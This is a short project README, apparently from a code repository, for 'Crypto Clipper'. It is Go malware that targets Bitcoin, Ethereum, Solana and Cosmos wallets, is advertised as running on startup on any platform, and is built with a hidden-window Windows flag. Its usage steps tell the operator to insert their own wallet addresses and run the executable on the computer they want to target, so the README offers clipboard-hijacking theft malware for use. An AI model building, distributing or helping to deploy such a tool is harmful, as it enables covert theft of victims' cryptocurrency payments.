<div>
<img src="https://wallpapercave.com/wp/wp9800950.jpg"/>
  <h1 align="center">
    Crypto Clipper 🪙
  </h1>
</div>

<p align="center">
 Built with GOLANG. Supports Bitcoin, Ethereum, Solana, Cosmos 🔥
</p>

## Features:
- Supports Bitcoin, Ethereum, Solana, Cosmos wallets
- Runs on startup for any platform
- Up to date 2024

## Installation

### Build the code for your current OS:
```shell
go build -ldflags -H=windowsgui -o main.exe
```

### Build Cross-Platform (Optional):

#### Install Go Releaser
```shell
go install github.com/goreleaser/goreleaser/v2@latest
```

#### Build the cross platform code
```shell
goreleaser --snapshot --clean                          
```

### USAGE:
- Write your wallets inside of `MyWallets`
- Execute the .exe file in the computer you want to use it